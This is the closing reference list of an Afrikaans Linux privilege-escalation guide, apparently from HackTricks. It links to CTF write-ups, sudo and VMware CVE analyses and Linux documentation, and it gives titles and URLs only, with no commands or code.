- [13] [rtcrowley/linux-private-i: Linux-enumerasie- en eskalasie-van-voorregte-instrument](https://github.com/rtcrowley/linux-private-i)
- [14] [Wat is ’n Socket?](https://www.linux.com/news/what-socket/)
- [15] [Peppo (Proving Grounds)-skrywe](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [Kry toegang tot die D-BUS](https://www.linuxjournal.com/article/7744)
- [17] [SUID-uitvoerbare lêers: Linux-eskalasie van voorregte](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo Deel 2 – Linux-eskalasie van voorregte](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Hoe om ACL’s op Linux te bestuur](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [Redhat/CentOS-root via network-scripts](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [Wat is systemd?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (bash-rekenkundige inspuiting via logs, volledige ketting)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [GNU Bash-handleiding – BASH_ENV (opstartlêer vir nie-interaktiewe sessies)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR-simboliese skakel-eskalasie van voorregte)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (pg_basebackup cron-kopie → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – Jy noem dit, VMware verhoog dit (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: Sudo Chroot-eskalasie van voorregte](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – CVE-2025-32462 en CVE-2025-32463 Sudo-kwesbaarhede vir eskalasie van voorregte](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – PYC-bewaarplekgidse](https://peps.python.org/pep-3147/)
- [32] [Python importlib-dokumentasie](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit-kwessie #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [Plasing deur @paragonsec](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Wagwoorde op Linux aanteken](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Besonderhede van ’n logrotate-renvoorwaarde](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
{{#include ../../../banners/hacktricks-training.md}}
